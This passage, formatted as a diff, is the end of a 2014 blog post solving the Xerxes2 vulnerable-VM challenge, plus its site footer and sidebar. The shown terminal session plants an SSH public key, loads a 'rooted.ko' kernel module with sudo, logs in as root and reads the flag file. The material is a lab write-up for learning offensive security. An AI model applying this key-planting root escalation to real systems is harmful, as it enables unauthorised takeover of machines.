+</span><span class='line'><span class="s1">make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;</span>
+</span><span class='line'>
+</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6sCFrz036WAchGk66yROuY+hePiULr49D1E97wuK0mK4Uw0J+4u1ngDVw+h8xwtpxPZkOWcn7s86OkXcEkWzGoduC1Y+YMP0XnQFG4hdeX4yNypaAsLKZss6tTHe5kHzbTdiOUthSmiJHwyl39TXibSBILTnMOLaxzLM17xUCfJviRm2mOAq6uELYPPf8thzqVeBoIsdXfjh8QeLMRHloyjGe1ZeY0m4pqwg9d2azaBAirjBMv0cyk+1w51SNR61EQ6SRtc6BE7ayc6C+MZW4TkP/lwOQLH7CXrEoyL3bDskD6c9563jRSLtiVfzjfkjoyUDiTCWv/ThirZMqSot/&quot;</span> &gt; /tmp/pubkey
+</span><span class='line'>
+</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>sudo insmod rooted.ko
+</span><span class='line'>
+</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>dmesg <span class="p">|</span> tail
+</span><span class='line'><span class="o">[</span>   14.512040<span class="o">]</span> eth0: no IPv6 routers present
+</span><span class='line'><span class="o">[</span>  290.023022<span class="o">]</span> Clocksource tsc unstable <span class="o">(</span><span class="nv">delta</span> <span class="o">=</span> 4686567555 ns<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>  290.025022<span class="o">]</span> Switching to clocksource acpi_pm
+</span><span class='line'><span class="o">[</span>57198.109946<span class="o">]</span> bf<span class="o">[</span>25367<span class="o">]</span>: segfault at 40062000 ip 40062000 sp bfc6282c error 14
+</span><span class='line'><span class="o">[</span>68192.983366<span class="o">]</span> hello: module license <span class="s1">&#39;unspecified&#39;</span> taints kernel.
+</span><span class='line'><span class="o">[</span>68192.983369<span class="o">]</span> Disabling lock debugging due to kernel taint
+</span><span class='line'><span class="o">[</span>68192.983637<span class="o">]</span> Loading hello module...
+</span><span class='line'><span class="o">[</span>74155.086393<span class="o">]</span> Loading rooted module...
+</span><span class='line'><span class="o">[</span>74155.086397<span class="o">]</span> Call Usermodehelper...
+</span><span class='line'><span class="o">[</span>74155.086449<span class="o">]</span> Done usermodehelper...
+</span><span class='line'>
+</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span><span class="nb">logout</span>
+</span><span class='line'>Connection to 192.168.56.102 closed.
+</span><span class='line'>
+</span><span class='line'>root@kali:~/Desktop/xeres2# ssh root@192.168.56.102 -i delacroix
+</span><span class='line'>
+</span><span class='line'>Welcome to xerxes2.
+</span><span class='line'>      XERXES wishes you
+</span><span class='line'>       a pleasant stay.
+</span><span class='line'>____   ___  ____  ___  __ ____   ___  ____     ____     ____
+</span><span class='line'><span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span class="se">\ </span> 6MMMMb
+</span><span class='line'> <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM69 &quot;  `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM<span class="s1">&#39;    ` MM&#39;</span>  <span class="sb">`</span>Mb
+</span><span class='line'>  <span class="sb">`</span>MM,P   MM    MM MM<span class="s1">&#39;      `MM,P   MM    MM YM.           ,MM </span>
+</span><span class='line'><span class="s1">   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
+</span><span class='line'>   d<span class="sb">`</span>MM.  MM       MM        d<span class="sb">`</span>MM.  MM            <span class="sb">`</span>Mb   ,M<span class="s1">&#39;    </span>
+</span><span class='line'><span class="s1">  d&#39;</span> <span class="sb">`</span>MM. YM    d9 MM       d<span class="s1">&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
+</span><span class='line'>_d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
+</span><span class='line'>
+</span><span class='line'>root@xerxes2:~# id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>root@xerxes2:~# cat /root/flag.txt
+</span><span class='line'>____   ___  ____  ___  __ ____   ___  ____     ____     ____
+</span><span class='line'><span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span class="se">\ </span> 6MMMMb
+</span><span class='line'> <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM69 &quot;  `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM<span class="s1">&#39;    ` MM&#39;</span>  <span class="sb">`</span>Mb
+</span><span class='line'>  <span class="sb">`</span>MM,P   MM    MM MM<span class="s1">&#39;      `MM,P   MM    MM YM.           ,MM </span>
+</span><span class='line'><span class="s1">   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
+</span><span class='line'>   d<span class="sb">`</span>MM.  MM       MM        d<span class="sb">`</span>MM.  MM            <span class="sb">`</span>Mb   ,M<span class="s1">&#39;    </span>
+</span><span class='line'><span class="s1">  d&#39;</span> <span class="sb">`</span>MM. YM    d9 MM       d<span class="s1">&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
+</span><span class='line'>_d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
+</span><span class='line'>
+</span><span class='line'>    congratulations on beating xerxes2!
+</span><span class='line'>
+</span><span class='line'>    I hope you enjoyed it as much as I did making xerxes2.
+</span><span class='line'>    xerxes1 has been described as <span class="s1">&#39;weird&#39;</span> and <span class="s1">&#39;left-field&#39;</span>
+</span><span class='line'>    and I hope that this one fits that description too :<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>    Many thanks to @TheColonial <span class="p">&amp;</span> @rasta_mouse <span class="k">for </span>testing!
+</span><span class='line'>
+</span><span class='line'>    Ping me on <span class="c">#vulnhub for thoughts and comments!</span>
+</span><span class='line'>
+</span><span class='line'>                      @barrebas, July 2014
+</span><span class='line'>root@xerxes2:~#
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>conclusion</h2>
+
+<p>Xerxes2 really challenged me into learning a ton of new things so this Vulnerable VM was a total win for me! Thanks <a href="https://twitter.com/barrebas">@barrebas</a> and <a href="https://twitter.com/VulnHub">@VulnHub</a> for another great learning opportunity.</p>
+
+<p>Now, the next step? OSCP :)</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Leon Jacobs</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-08-09T16:59:53+02:00" pubdate data-updated="true">Aug 9<sup>th</sup>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/challenge/'>challenge</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/solution/'>solution</a>, <a class='category' href='/blog/categories/vulnerable-vm/'>vulnerable vm</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://leonjza.github.io/blog/2014/08/09/beating-xerxes2/" data-via="leonjza" data-counturl="http://leonjza.github.io/blog/2014/08/09/beating-xerxes2/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/08/07/flick-can-you-find-the-flag/" title="Previous Post: flick - can you find the flag?">&laquo; flick - can you find the flag?</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/08/09/beating-xerxes2/">Beating Xerxes 2 (No, Not the Persian King)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/08/07/flick-can-you-find-the-flag/">Flick - Can You Find the Flag?</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/07/20/hell-would-just-not-freeze-over/">Hell Would Just Not Freeze Over!</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/07/17/climbing-the-skytower/">Climbing the SkyTower</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/">Dnsfilexfer - Yet Another Take on File Transfer via DNS</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/">/root/flag.txt - Solving the Relativity Vulnerable VM</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot/">Zeus - My Adventure With a Infamous Bot</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/08/03/kvm-redirecting-centos-kernel-and-tty-output-to-a-virtual-serial-console/">KVM - Redirecting CentOS Kernel and Tty Output to a Virtual Serial Console</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/07/31/url-expansion-im-paranoid-like-that/">URL Expansion - I'm Paranoid Like That</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/07/27/stuff-to-gource/">'Stuff' to Gource.</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/leonjza">@leonjza</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'leonjza',
+            count: 2,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Leon Jacobs -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
